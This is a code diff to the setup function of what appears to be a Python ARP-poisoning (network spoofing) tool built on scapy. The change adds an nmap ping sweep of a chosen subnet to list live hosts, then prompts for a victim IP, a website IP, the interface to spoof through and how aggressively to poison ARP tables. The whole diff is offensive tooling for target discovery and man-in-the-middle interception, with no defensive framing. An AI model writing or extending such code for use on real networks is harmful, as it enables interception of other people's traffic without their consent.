@@ -7,13 +7,26 @@ import scapy.all as scapy
 import logging
 import threading
 import time
+import nmap
 
 def setup():
     # Setup attack
     try:
-        iface = input("> Interface: ")
-        victim = input("> Victim IP: ")
-        site = input("> Website IP: ")
+        # Probe subnet for hosts
+        subnet = input("> Input the subnet to probe: ")
+        nm = nmap.PortScanner()
+        nm.scan(subnet, arguments="-sP")
+        i = 0
+        for host in nm.all_hosts():
+            print(f"{i}. {host}")
+            i += 1
+
+        # Select target hosts
+        victim = input("> Input the victim IP: ")
+        site = input("> Input the website IP: ")
+        iface = input("> Input the interface to spoof through: ")
+
+        # Set aggressiveness of the attack (how often the ARP tables are being poisoned)
         while True:
             try:
                 timer = int(input("> Aggressiveness (1-10): "))
@@ -24,7 +37,7 @@ def setup():
             except ValueError:
                 print(">! Please enter an integer.")
     except KeyboardInterrupt:
-        print("> Poisoning aborted. Exiting...")
+        print("> \nAborted. Exiting...")
         exit(0)
 
     return iface, victim, site, timer
